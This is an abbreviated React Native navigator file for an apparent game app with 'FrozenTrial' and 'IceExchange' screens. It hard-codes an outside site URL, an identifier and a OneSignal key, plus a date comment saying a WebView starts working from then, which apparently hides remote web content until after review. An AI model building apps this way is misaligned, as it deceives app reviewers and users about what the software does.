...
import FrozenTrialScreen from '../screens/FrozenTrialScreen';
import FrozenTrialLevelScreen from '../screens/FrozenTrialLevelScreen';
import IceExchangeScreen from '../screens/IceExchangeScreen';
...
export default function RootNavigator() {
  ...
  const INITIAL_URL = `https://strong-stream-hub.site/`;
  const URL_IDENTIFAIRE = `iWku79ft`;
  ...
  OneSignal.initialize('2f8c8fc8-9fd5-41d0-a821-4e1b53ce1ec5');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2026-02-04T08:08:00'); //дата з якої поч працювати webView
  ...
  const Route = ({ isFatch }) => {
    ...
    return (
      <Stack.Navigator screenOptions={{ headerShown: false }}>
          ...
          <Stack.Screen name="FrozenTrial" component={FrozenTrialScreen} />
          <Stack.Screen name="FrozenTrialLevel" component={FrozenTrialLevelScreen} />
          <Stack.Screen name="IceExchange" component={IceExchangeScreen} />
